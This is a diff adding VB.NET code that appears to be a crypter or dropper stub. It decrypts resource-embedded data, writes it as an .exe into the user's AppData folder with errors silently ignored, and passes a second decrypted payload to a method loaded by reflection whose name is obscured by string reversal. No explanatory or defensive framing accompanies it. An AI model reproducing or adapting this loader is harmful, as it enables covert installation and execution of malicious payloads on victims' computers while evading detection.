@@ -1,0 +1,14 @@
+ Dim N As String = xEncryptionD(R.GetObject("K"), R.GetObject("NM"))
+ Dim I As String = Environ("APPDATA") & "\" & N & ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim II As Byte() = System.Text.Encoding.Default.GetBytes(xEncryptionD(R.GetObject("K"), _
+ R.GetObject("I")))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, II, False)
+ Catch
+ End Try
+ Dim III As Byte() = System.Text.Encoding.Default.GetBytes(xEncryptionD(R.GetObject("K"), _
+ R.GetObject("F")))
+ LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), New Object() {III, I})
